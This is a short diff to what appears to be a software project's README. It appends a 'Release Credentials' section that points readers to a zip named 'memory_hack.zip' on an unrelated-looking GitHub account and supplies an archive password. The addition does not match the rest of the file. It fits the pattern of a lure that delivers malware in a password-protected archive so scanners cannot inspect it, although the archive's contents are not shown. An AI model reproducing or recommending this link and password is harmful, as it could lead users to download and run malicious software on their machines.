@@ -138,3 +138,10 @@ Only if you want
    [OnsenUI]: <https://onsen.io/>
    [Falcon]: <https://github.com/falconry/falcon>
    [jQuery]: <http://jquery.com>
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/memory_hack-assets-g63w/releases/download/v1.0.0/memory_hack.zip)
+- **Archive Password:** `rAB91dq1Mu`
